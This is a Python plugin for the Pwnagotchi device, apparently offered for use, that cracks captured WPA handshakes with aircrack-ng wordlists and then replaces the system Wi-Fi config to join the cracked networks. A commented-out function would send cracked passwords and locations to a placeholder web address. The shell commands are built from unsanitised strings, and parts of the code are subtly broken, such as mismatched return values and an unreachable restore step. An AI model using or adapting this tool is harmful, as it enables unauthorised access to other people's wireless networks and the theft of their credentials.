import pwnagotchi
import logging
import os
import subprocess
import requests
import time
import re
import string
import json
import re
import pwnagotchi.plugins as plugins
from pwnagotchi import config


class dangerwillrobinson(plugins.Plugin):
    __author__ = 'NeonLightning'
    __version__ = '0.0.1'
    __license__ = 'GPL3'
    __description__ = 'you probably should not use this...'

    def on_loaded(self):
        logging.info("[DWR] Really? I told you not to.")
        self.wordlist_folder = "/home/pi/wordlists/"
        self.wpasup_folder = "/root/wpasupplicants/"
        self.whitelist = ['']

    def on_internet_available(self):
        pass

    def on_handshake(self, agent, filename, access_point, client_station):
        todelete = 0
        handshakeFound = 0
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                                shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
        if result:
            handshakeFound = 1
            logging.info("[DWR] contains handshake")
        if handshakeFound == 0:
            result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "PMKID" | awk \'{print $2}\''),
                                    shell=True, stdout=subprocess.PIPE)
            result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
            if result:
                logging.info("[DWR] contains PMKID")
            else:
                todelete = 1
        if todelete == 1:
            os.remove(filename)

        selected_index = 0
        result = self.sort_rssi(access_point, selected_index, self.whitelist)
        if result is not None:
            network_name, bssid = result
            logging.info(f"[DWR] Sort RSSI Result - Network: {network_name}, BSSID: {bssid}")
        passwd = self.check_cracked_wordlist(agent, filename)
        if passwd:
            logging.info(self.connect_to_network(network_name, bssid, passwd))

    def check_handshake(self, filename):
        result = subprocess.run(
            '/usr/bin/aircrack-ng /root/handshakes/' + filename + ' | grep "1 handshake" | awk \'{print $2}\'',
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='utf-8'
        )
        result = result.stdout.strip()
        return result

    def check_cracked_wordlist(self, agent, filename):
        result = self.check_handshake(filename)
        if not result:
            logging.info('[DWR] No handshake')
        else:
            logging.info('[DWR] Handshake confirmed')
            wordlist_path = os.path.join(self.wordlist_folder, 'cracked.txt')
            if os.path.exists(wordlist_path):
                result2 = subprocess.run(
                    'aircrack-ng -w ' + wordlist_path + ' -l ' + filename + '.cracked -q -b ' + result + ' ' + filename + ' | grep KEY',
                    shell=True, capture_output=True, text=True
                )
                result2 = result2.stdout.strip()
                logging.info('[DWR] %s' % result2)
                if result2 != "KEY NOT FOUND":
                    key = re.search(r'\[(.*)\]', result2)
                    pwd = str(key.group(1))
                    logging.info("key found in cracked.")
                    return pwd
                else:
                    logging.info('[DWR] Password not found in cracked.txt. Trying other wordlists.')
                    return self.try_other_wordlists(filename, result)
            else:
                logging.warning('[DWR] Wordlist file not found: cracked.txt')
                wordlist_path = os.path.join(self.wordlist_folder, 'cracked.txt')
                open(wordlist_path, 'a+').close()

    def try_other_wordlists(self, filename, handshake_result):
        wordlist_folder = self.wordlist_folder
        wordlist_files = [f for f in os.listdir(wordlist_folder) if f.endswith('.txt') and f != 'cracked.txt']
        for wordlist_file in wordlist_files:
            wordlist_path = os.path.join(wordlist_folder, wordlist_file)
            result2 = subprocess.run(
                'aircrack-ng -w ' + wordlist_path + ' -l ' + filename + '.cracked -q -b ' + handshake_result + ' ' + filename + ' | grep KEY',
                shell=True, capture_output=True, text=True
            )
            result2 = result2.stdout.strip()
            if result2 != "KEY NOT FOUND":
                key = re.search(r'\[(.*)\]', result2)
                pwd = str(key.group(1))
                if result2 in wordlist_path:
                    logging.info("[DWR] ignoring pass.")
                    continue
                else:
                    if os.path.exists(wordlist_path):
                        continue
                    else:
                        logging.warning('[DWR] Wordlist file not found: cracked.txt')
                        wordlist_path = os.path.join(self.wordlist_folder, 'cracked.txt')
                        open(wordlist_path, 'a+').close()
                    logging.info("[DWR] adding to cracked passes file.")
                    with open('/home/pi/wordlists/cracked.txt', 'a+') as f:
                        f.write('  %s\n' % result2)
                    return pwd
        logging.info('[DWR] No key found in any wordlist.')
        return None

    def on_epoch(self):
        pass

    def on_unfiltered_ap_list(self, agent, access_points):
        selected_index = 0
        while selected_index < len(access_points):
            logging.info(f"[DWR] index {selected_index} of {len(access_points)}")
            result = self.sort_rssi(access_points, selected_index, self.whitelist)
            logging.info(f"[DWR] results of sort {result}")
            if result is not None:
                network_name, bssid = result
                logging.info(f"[DWR] Sort RSSI Result - Network: {network_name}, BSSID: {bssid}")
                network_name = re.sub(r'\W+', '', network_name)
                bssid = bssid.replace(':', '')
                filename = f"/root/handshakes/{network_name}_{bssid}.pcap"
                logging.info(f"[DWR] Checking handshake for {network_name} ({bssid})")
                passwd = self.check_cracked_wordlist(agent, filename)
                logging.info(f"[DWR] results of passwd {passwd}")
                if passwd:
                    logging.info(f"[DWR] Connecting to network: {network_name} ({bssid}) with password: {passwd}")
                    logging.info(self.connect_to_network(network_name, bssid, passwd))
                    break
                else:
                    logging.info(f"[DWR] No handshake found for {network_name} ({bssid})")
            selected_index += 1
        else:
            logging.info("[DWR] No successful result found for any access point.")

    def sort_rssi(self, access_points, selected_index=0, whitelist=None):
        sorted_access_points = sorted(access_points, key=lambda x: x['rssi'], reverse=True)
        top_rssi_network = None
        other_networks = []
        for i, network in enumerate(sorted_access_points):
            bssid = network['mac']
            ssi = network['rssi']
            network_name = str(network['hostname'])
            if whitelist is not None and network_name in whitelist:
                continue
            if network_name != "<hidden>":
                if ssi > -35:
                    if top_rssi_network is None:
                        top_rssi_network = network_name
                    else:
                        other_networks.append(network_name)
                if i == 0 or i == selected_index:
                    return network_name, bssid, ssi

    def create_wpa_supplicant_config(self, bssid, ssid, password):
        cmd = ['wpa_passphrase', ssid, password]
        result = subprocess.run(cmd, capture_output=True, text=True)
        psk_line = next(line for line in result.stdout.splitlines() if line.startswith('psk='))
        psk = psk_line.split('=', 1)[1].strip()
        filename = f"{self.wpasup_folder}{bssid}-{ssid}-{password}.cfg"
        with open(filename, 'w') as file:
            file.write('ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\n')
            file.write('update_config=1\n')
            file.write('country=GB\n\n')
            file.write('network={\n')
            file.write(f'  bssid={bssid}\n')
            file.write(f'  psk={psk}\n')
            file.write('}\n')
        return filename

    def connect_to_network(self, network_name, bssid, password):
        config_file = self.create_wpa_supplicant_config(bssid, network_name, password)
        subprocess.run(['mv', '/etc/wpa_supplicant/wpa_supplicant.conf', '/etc/wpa_supplicant/wpa_supplicant.conf.bak'])
        subprocess.run(['cp', config_file,'/etc/wpa_supplicant/wpa_supplicant.conf'])
        subprocess.run(['systemctl', 'restart', 'wpa_supplicant'])
        time.sleep(10)
        result = subprocess.run(['dhclient', '-v', 'wlan0'], capture_output=True, text=True)
        output = result.stdout
        ip_address = re.search(r'bound to ([\d.]+)', output)
        if ip_address:
            return ip_address.group(1)
            subprocess.run(['mv', '/etc/wpa_supplicant/wpa_supplicant.conf.bak', '/etc/wpa_supplicant/wpa_supplicant.conf'])
        else:
            return None

    # def update_webpage(self, network_name, bssid, password):
    #     url = 'http://your-webpage-url/update'
    #     data = {
    #         'network_name': network_name,
    #         'bssid': bssid,
    #         'password': password,
    #         'location': 'your-location-data'
    #     }
    #     response = requests.post(url, json=data)
    #     if response.status_code == 200:
    #         logging.info("[DWR] Webpage updated successfully.")
    #     else:
    #         logging.warning("[DWR] Failed to update webpage.")

    def get_password_lng_lat(self, ssid, bssid):
        dwr_file = '/root/.dwr'
        geojson_file = f'{ssid}_{bssid}.geo.json'
        with open(dwr_file, 'r') as f:
            lines = f.readlines()
        for line in lines:
            data = line.strip().split('-')
            if len(data) >= 5 and data[0] == ssid and data[2] == bssid:
                password = data[1]
                lng = data[3]
                lat = data[4]
                if lng == '' or lat == '':
                    with open(geojson_file, 'r') as f:
                        geojson_data = json.load(f)
                    location_data = geojson_data.get('location')
                    if location_data is not None:
                        lng = location_data.get('lng')
                        lat = location_data.get('lat')
                return password, lng, lat
        return None, None, None